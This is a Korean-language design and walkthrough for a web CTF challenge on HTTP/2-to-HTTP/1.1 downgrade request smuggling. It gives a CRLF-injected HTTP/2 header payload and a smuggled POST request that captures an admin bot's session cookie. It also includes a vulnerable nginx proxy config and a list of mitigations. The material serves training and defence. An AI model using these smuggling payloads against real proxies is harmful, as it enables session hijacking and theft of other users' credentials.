---
title: HTTP/2 to HTTP/1.1 Downgrade Request Smuggling — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, http2, request-smuggling, downgrade, proxy-mismatch, protocol-vulnerability]
confidence: high
---

# HTTP/2 to HTTP/1.1 Downgrade Request Smuggling — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Multi-Protocol Fast Gate (다중 프로토콜 고속 게이트웨이)
- **난이도**: High
- **핵심 컨셉**: 최신 웹 통신 규격인 **HTTP/2**와 백엔드의 레거시 **HTTP/1.1** 프로토콜 변환(Downgrade) 과정에서 발생하는 헤더 파싱 불일치를 악용하는 **HTTP/2 Request Smuggling (H2.CL / H2.TE)** 취약점 문제입니다. 대상 애플리케이션 프록시는 클라이언트와 고속 HTTP/2 통신을 수립하여 헤더 필드를 파싱하고, 이를 백엔드 웹 서버로 인계할 때는 단일 커넥션 하에서 HTTP/1.1 패킷 형식으로 재조립(Downgrade)하여 전송합니다. 공격자는 HTTP/2 요청의 의사 헤더(Pseudo-header)나 필드 값 내부에 임의의 개행 기호 및 HTTP/1.1 패킷 구조를 은폐 주입하여, 다운그레이드 변환 시점에 백엔드가 패킷 경계를 오판하고 다음 대기 유저의 요청 문맥으로 임의의 쉘 명령이나 인증 위조 쿼리를 삽입(Smuggling)하게 만듭니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend Reverse Proxy (HTTP/2 Enabled)**:
  - 클라이언트와는 ALPN/TLS를 거쳐 HTTP/2 통신 처리.
  - 들어온 HTTP/2 프레임(Header Frame, Data Frame)을 백엔드로 넘겨주기 위해 단일 Keep-Alive 연결 하에 HTTP/1.1 텍스트 스트림으로 변환.
- **Backend Web Server (HTTP/1.1 Only)**:
  - 텍스트 스트림에서 `Content-Length` 또는 `Transfer-Encoding`을 읽어 요청의 끝을 판별.
- **Flag 위치**:
  - 관리자 봇(Admin Bot)이 접속할 때 요청을 스머글링 가로채서, 봇의 세션 쿠키 정보(`admin_session=FLAG`)를 탈취하여 획득.

### 2.2 취약점 지점
1. **Unsanitized HTTP/2 Header Values (개행 차단 누락)**:
   - HTTP/2는 헤더를 텍스트가 아닌 바이너리 프레임(Binary Frame) 단위로 전송하기 때문에 헤더 값 내부에 `\r\n` (개행) 문자가 포진해 있더라도 프로토콜 수준에서 문법 에러가 발생하지 않습니다.
   - 프록시가 이 헤더 스트림을 그대로 가져와 HTTP/1.1 규격 텍스트로 풀어낼 때, 공격자가 숨겨둔 `\r\n`이 실제 개행으로 활성화되어 `Content-Length` 헤더를 임의 오버라이드하거나 요청 분할을 발생시킵니다.
2. **H2.CL / H2.TE Mismatch**:
   - HTTP/2 헤더에 강제로 `content-length`를 실제 Data 프레임 바디 길이와 다르게 기입해도 프록시는 프레임 크기 기준으로 통신을 제어해 백엔드에 밀어 넣습니다.
   - 백엔드는 다운그레이드된 텍스트 중 `content-length: [공격자가_조작한_값]`을 신뢰하여, 요청 바디 뒤쪽의 추가 전송 텍스트 조각을 다음번 HTTP 요청 커넥션의 새로운 헤더 패킷 시작점으로 착각(Smuggle)합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 수신 프로토콜 | 백엔드 전송 프로토콜 | 인젝션 포인트 | 공격 핵심 영향 |
|------------|---------------|-----------------------|---------------|----------------|
| `/` | HTTP/2 (TLS) | HTTP/1.1 (TCP 80) | HTTP/2 Headers (예: `foo: bar\r\ncontent-length: 0`) | 백엔드 소켓 스트림 내 후속 요청 가로채기 및 변조 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 프록시 변환 환경 파악
1. 포털 접속 시 응답 헤더나 TLS 핸드셰이크 협상 스펙을 통해 HTTP/2가 구동되고 있음을 확인합니다.
2. Nginx, Envoy, AWS ALB 등 백엔드 변환 프록시의 종류를 유추하고, HTTP/2 헤더에 주입한 값의 이스케이프 상태를 점검합니다.

### Step 2. 다운그레이드 우회 페이로드 설계
공격자는 HTTP/2 요청 전송을 위해 전용 도구(예: Burp Suite HTTP/2 tab, custom python script)를 사용합니다.
- **주입용 HTTP/2 요청 헤더 명세**:
  - `:method`: `POST`
  - `:path`: `/`
  - `:authority`: `target.local`
  - `custom-header`: `val\r\ncontent-length: 0\r\n\r\nGET /fake HTTP/1.1\r\nHost: target.local\r\nfoo: bar` (개행 문자가 포함된 바이너리 데이터 주입)
- **프록시 변환 후 백엔드로 인계되는 HTTP/1.1 패킷 구조**:
  ```http
  POST / HTTP/1.1
  Host: target.local
  custom-header: val
  content-length: 0
  
  GET /fake HTTP/1.1
  Host: target.local
  foo: bar
  ```
  *(백엔드 파서는 `content-length: 0`을 기준으로 POST 요청을 종결 처리하므로, 그 뒤에 딸려 온 `GET /fake...` 문자열을 동일 커넥션 상의 다음 패킷 데이터 시작부로 인식하게 됨)*

### Step 3. 스머글링 주입 및 대기 (Smuggle Pipeline Execution)
공격자는 피해자의 요청을 공격자 사이트로 밀어내기 위해, 타겟 소켓 버퍼 뒤쪽에 데이터 누출용 파이프라인 구조를 합성해 대기시킵니다.
- **최종 스머글 주입 데이터 조각**:
  ```http
  POST /api/log HTTP/1.1
  Host: target.local
  Content-Length: 500
  Connection: keep-alive
  
  leak_data=
  ```
  *(뒤따라 들어오는 일반 피해자의 요청이 이 `leak_data=` 바로 뒤에 연달아 도킹되므로, 피해자의 요청 헤더 전체가 공격자의 `/api/log` POST 바디 본문으로 포함되어 저장되는 현상이 성립함)*

### Step 4. flag 획득
1. 공격자가 스머글링 패킷을 쏜 직후, 관리자 봇(Admin Bot)이 로그인 쿠키를 들고 `/` 경로에 접속을 시도합니다.
2. 관리자 봇의 요청은 공격자가 소켓 버퍼에 잔존시켜 둔 `leak_data=` 뒤에 바인딩되어 통째로 백엔드 서버에 전달됩니다.
3. 백엔드는 이를 하나의 `POST /api/log` 요청으로 파싱하여, 본문 바디 덤프 데이터를 공격자 통제 영역 로그에 고스란히 저장합니다.
4. 공격자는 자신의 로그 뷰어에서 덤프된 관리자 봇의 HTTP 리퀘스트 헤더 속 쿠키 세션(`admin_session=FLAG{http2_downgrade_request_smuggling_hijacking}`)을 해독하여 플래그를 취득합니다.

---

## 5. 취약점 유발 백엔드 및 프록시 설정 스니펫

### Nginx (취약한 HTTP/2 변환 프록시 가상 개념)
```nginx
# nginx.conf (HTTP/2 다운그레이드 설정 예시)
server {
    listen 443 ssl http2; # HTTP/2 활성화
    server_name gate.challenge.local;

    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;

    location / {
        # 취약점 지점: 헤더 값 내부의 개행문자(\r\n)를 필터링(Strip/Reject)하지 않고 
        # 그대로 HTTP/1.1 규격 텍스트로 매핑하여 백엔드 소켓 스트림으로 넘김
        proxy_pass http://backend_http11_server:8080;
        proxy_http_version 1.1;
        proxy_set_header Connection "";
    }
}
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **HTTP/2 헤더 값 개행 정제 (Sanitize Binary Header Values)**:
   - 프록시 게이트웨이가 HTTP/2 헤더를 수집 및 파싱할 때, 값 필드 내부에 제어 문자인 CR(`\r`), LF(`\n`), NUL(`\x00`)이 매핑되어 있는 요청은 파이프라인 변환 전에 즉각 차단하고 `400 Bad Request` 에러로 처리해야 합니다.
2. **백엔드 통신 규격 일치화 (End-to-End HTTP/2)**:
   - 프록시와 백엔드 간의 통신 프로토콜을 HTTP/1.1 다운그레이드 대신, 프로토콜 종류를 단일하게 HTTP/2 또는 HTTP/3로 끝까지 일치시켜 텍스트 경계 분석 모호성 위협을 원천 해결합니다.
3. **Keep-Alive 재사용 격리**:
   - 프록시가 다중 클라이언트 요청을 처리할 때, 서로 다른 사용자의 요청 세션을 단일 백엔드 TCP 연결 커넥션에 배칭(Connection Pooling)하지 않고, 개별 사용자 세션 단위로 백엔드 연결을 독립 격리하여 파이프라인 간섭을 예방합니다.
